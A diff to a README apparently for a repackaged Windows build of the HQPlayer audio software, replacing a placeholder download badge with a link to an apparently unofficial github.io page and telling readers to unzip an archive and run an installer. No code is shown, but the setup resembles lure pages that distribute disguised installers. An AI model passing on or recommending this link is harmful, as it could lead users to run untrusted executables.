@@ -8,7 +8,7 @@ By combining **bit-perfect output, precision dithering, and customizable DSP alg
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-teal?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-teal?style=for-the-badge)](https://hqplayer-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
